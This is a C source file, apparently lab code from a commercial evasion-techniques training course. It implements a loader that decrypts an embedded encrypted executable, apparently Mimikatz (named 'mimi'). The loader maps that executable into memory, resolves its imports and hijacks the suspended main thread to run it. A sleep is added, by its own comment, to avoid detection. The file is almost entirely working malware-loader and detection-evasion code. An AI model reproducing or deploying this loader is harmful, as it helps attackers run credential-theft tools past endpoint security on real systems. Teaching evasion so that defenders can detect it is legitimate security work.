/*
 * -----------------------------------------------------------
 * This code is part of the Evasion Lab for the
 * Certified Evasion Techniques Professional (CETP) course
 * by Altered Security.
 *
 * Copyright (c) 2025 Altered Security. All rights reserved.
 *
 * This code is provided solely for educational purposes.
 * Unauthorized use, duplication, or distribution of this
 * code is strictly prohibited without explicit permission
 * from Altered Security.
 * -----------------------------------------------------------
 */

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#include "mimi.h" // Contains encrypted PE buffer (PEBuff) and key buffer (keyBuff)


/*
 * Function: RestoreIt
 * Purpose: Decrypts the PE file using AES-256
 * Inputs:
 *  - pedata: Pointer to encrypted PE data
 *  - peLen: Length of PE data
 *  - key: Pointer to decryption key
 *  - keyLen: Length of decryption key
 */
void RestoreIt(unsigned char* pedata, DWORD peLen, unsigned char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    // initializes the cryptographic provider.
    // PROV_RSA_AES : Specifies the AES algorithm provider.
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }

    // Create a SHA-256 hash object
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return;
    }

    // Hash the decryption key into the SHA-256 hash.
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        return;
    }

    // generates a 256-bit AES key from the SHA-256 hash.
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return;
    }

    // Decrypt the PE buffer using AES-256 key
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)pedata, &peLen)) {
        return;
    }

    // Cleanup cryptographic handles
    CryptReleaseContext(hProv, 0); // Releases the cryptographic provider.
    CryptDestroyHash(hHash); //  Destroys the SHA-256 hash object.
    CryptDestroyKey(hKey); // Destroys the AES key.

}


/*
 * Function: ValidPE
 * Purpose: Verifies whether a given memory buffer is a valid PE file
 * Inputs:
 *  - lpImage: Pointer to the PE buffer
 * Returns:
 *  - TRUE if the buffer is a valid PE file, otherwise FALSE
 */
BOOL ValidPE(const LPVOID lpImage)
{
    PIMAGE_DOS_HEADER lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
    PIMAGE_NT_HEADERS lpImageNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE)
        return TRUE;

    return FALSE;
}


// Relocation structure for PE rebasing
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;


/*
 * Function: RunPE
 * Purpose: Loads, relocates, resolves imports, and executes the decrypted PE in memory
 * Inputs:
 *  - tHandle: Handle to the thread where execution will be redirected
 * Returns:
 *  - TRUE on success, FALSE on failure
 */

BOOL RunPE(HANDLE tHandle) {
    
    // Get the DOS header of the PE file stored in memory
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)PEBuff;

    // Get the NT headers of the PE file using the e_lfanew offset
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((char*)(PEBuff)+DOSheader->e_lfanew);
    
    // Check if the NT headers are valid
    if (!NTheader) {
        printf(" [-] Not a PE file\n");
        return FALSE;
    }

    // Allocate memory for the PE image in the current process
    BYTE* MemImage = (BYTE*)VirtualAlloc(NULL, NTheader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!MemImage) {
        printf(" [-] Failed in Allocating Image Memory (%u)\n", GetLastError());
        return FALSE;
    }
    
    // Copy the PE headers into the allocated memory
    memcpy(MemImage, PEBuff, NTheader->OptionalHeader.SizeOfHeaders);

    // Get the first section header of the PE file
    PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(NTheader);

    // Copy each section of the PE file to its respective virtual address in memory
    for (WORD i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)(MemImage)+sectionHdr[i].VirtualAddress, (BYTE*)(PEBuff)+sectionHdr[i].PointerToRawData, sectionHdr[i].SizeOfRawData);
    }

    // Apply relocations to adjust addresses in the PE file
    IMAGE_DATA_DIRECTORY DirectoryReloc = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    
    // If the PE file does not have a relocation table, print an error and return
    if (DirectoryReloc.VirtualAddress == 0) {
        printf("Failed in Relocating Image\n");
        return FALSE;
    }

    // Get the base relocation table
    PIMAGE_BASE_RELOCATION BaseReloc = (PIMAGE_BASE_RELOCATION)(DirectoryReloc.VirtualAddress + (ULONG_PTR)MemImage);
    
    // Process each relocation block
    while (BaseReloc->VirtualAddress != 0) {
        DWORD page = BaseReloc->VirtualAddress; // Extract the base RVA of the page that requires relocation.
        if (BaseReloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) // Ensure Block is Valid
        {
            // Determine Number of Relocation Entries in this Block
            size_t count = (BaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            // Get List of Relocation Entries that contains relocation offsets and types.
            BASE_RELOCATION_ENTRY* list = (BASE_RELOCATION_ENTRY*)(LPWORD)(BaseReloc + 1);
            
            // Iterate through each relocation entry
            for (size_t i = 0; i < count; i++) {
                if (list[i].Type & 0xA) {  // Check if the relocation type is valid

                    // Compute the Absolute Address to Patch
                    DWORD rva = list[i].Offset + page;
                    PULONG_PTR p = (PULONG_PTR)((LPBYTE)MemImage + rva);

                    // Adjust the address by subtracting the original image base and adding the new base
                    *p = ((*p) - NTheader->OptionalHeader.ImageBase) + (ULONG_PTR)MemImage;
                }
            }
        }
        // Move to the next relocation block
        BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)BaseReloc + BaseReloc->SizeOfBlock);
    }

    // This retrieves the Import Table Directory Entry
    IMAGE_DATA_DIRECTORY DirectoryImports = NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    // Check if Imports Exist
    if (!DirectoryImports.VirtualAddress) {
        return FALSE;
    }

    // Get the first import descriptor
    PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(DirectoryImports.VirtualAddress + (ULONG_PTR)MemImage);
    
    // Process each DLL in the import table
    while (ImportDescriptor->Name != NULL)
    {
        // Retrieve DLL Name
        LPCSTR ModuleName = (LPCSTR)ImportDescriptor->Name + (ULONG_PTR)MemImage;

        // Load the module
        HMODULE Module = LoadLibraryA(ModuleName);
        if (Module)
        {
            // Get the First Thunk (IAT Pointer) that contains function pointers that must be resolved.
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)MemImage + ImportDescriptor->FirstThunk);

            // This loop will resolve function addresses for each import
            while (thunk->u1.AddressOfData != NULL)
            {
                ULONG_PTR FuncAddr = NULL;

                // If the function is imported by ordinal, resolve by ordinal
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    // GetProcAddress() retrieves the function address using the ordinal.
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    FuncAddr = (ULONG_PTR)GetProcAddress(Module, functionOrdinal);
                }
                else  // If imported by name, resolve by function name
                {
                    // GetProcAddress() retrieves the function address using the function name.
                    PIMAGE_IMPORT_BY_NAME FuncName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)MemImage + thunk->u1.AddressOfData);
                    FuncAddr = (ULONG_PTR)GetProcAddress(Module, FuncName->Name);
                }

                // Store the Function Pointer in the IAT
                thunk->u1.Function = FuncAddr;

                // Move to the Next Function
                ++thunk;
            }
        }

        // Move to the next DLL in the import table
        ImportDescriptor++;
    }
    
    // Create a CONTEXT structure to manipulate thread execution
    // The CONTEXT structure holds register values and execution state for a thread.
    // CONTEXT_FULL to retrieve all register values
	CONTEXT CTX = { 0 };
	CTX.ContextFlags = CONTEXT_FULL;

    // retrieves the current register state of tHandle (the target thread).
	BOOL bGetContext = GetThreadContext(tHandle, &CTX);
	if (!bGetContext) {
		printf("[-] An error occurred when trying to get the thread context.\n");
		return FALSE;
	}

    // Set the new instruction pointer (RIP) to the entry point of the loaded PE file
	CTX.Rip = NTheader->OptionalHeader.AddressOfEntryPoint + (ULONG_PTR)MemImage;

    // Set the modified thread context so execution starts at the new entry point
	BOOL bSetContext = SetThreadContext(tHandle, &CTX);
	if (!bSetContext) {
		printf("[-] An error occurred when trying to set the thread context.\n");
		return FALSE;
	}
    
    // Delay execution to avoid immediate detection
	printf("[+] Delay time ...\n");
	SleepEx(20000, FALSE);


    // Resume execution of the thread, jumping to the new PE entry point
	ResumeThread(tHandle);
    
	return TRUE;
}



/*
 * Function: Doit
 * Purpose:
 *  - Suspends the main thread.
 *  - Decrypts and validates the embedded PE file.
 *  - Runs the decrypted PE file in memory. 
        (by mapping Headers & Sections, apply relocations and fix the IAT and trigger the EntryPoint)
 *
 * Inputs:
 *  - p: Pointer to the main thread handle.
 */
void Doit(LPVOID p) {
    
    // Retrieve the main thread handle from the passed parameter
    HANDLE mainThreadHandle = *(HANDLE*)p;

    // Suspend the main thread to prepare for execution hijacking
    SuspendThread(mainThreadHandle);
	printf("[+] mainThread suspended\n");
	

    // Decrypt the embedded PE file using the key stored in mimi.h
    printf("[+] mimi decrypted\n");
    RestoreIt(PEBuff, sizeof(PEBuff), keyBuff, sizeof(keyBuff));

    // Check if decryption was successful
    if (!PEBuff) {
        printf("[-] Failed in Loading remote PE (%u)\n", GetLastError());
        return ;
    }

    // Validate that the decrypted PE file is a valid Windows executable
    const BOOL bPE = ValidPE(PEBuff);
    if (!bPE)
    {
        printf("[-] The PE file is not valid !\n");

        // Free allocated memory for the PE buffer if validation fails
        if (PEBuff != nullptr)
            HeapFree(GetProcessHeap(), 0, PEBuff);
        return;
    }

    // If the PE file is valid, print confirmation
    printf("[+] The PE file is valid.\n");

    // Print the memory address where the PE data is loaded
    printf("[+] PE data : 0x%p\n", (LPVOID)(uintptr_t)PEBuff);

   
    // Run the PE in memory by modifying execution flow
    if (!RunPE(mainThreadHandle)) {
        printf("[-] Local Main Hollowing Failed\n");
    }


}



/*
 * Function: main
 * Purpose:
 *  - Duplicates the current thread handle.
 *  - Creates a new thread to execute "Doit".
 *  - Waits for the thread execution to complete.
 */

int main() {

    // Get a pseudo-handle to the current thread, the main thread.
    HANDLE pseudoHandle = GetCurrentThread();
    HANDLE realHandle;

    // Duplicate the pseudo-handle to get a real handle with the same access rights
    if (!DuplicateHandle(GetCurrentProcess(), pseudoHandle, GetCurrentProcess(), &realHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
        printf("[-] Failed to duplicate handle.\n");
        return 1;
    }

    // Create a new thread that executes "Doit" function with the duplicated main thread handle "realHandle"
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Doit, &realHandle, 0, NULL);
    
    // Wait for the "Doit" function to finish execution
    WaitForSingleObject(thread, INFINITE);

    // Cleanup: Close thread and handle
    CloseHandle(thread);
    CloseHandle(realHandle);

    return 0;

}



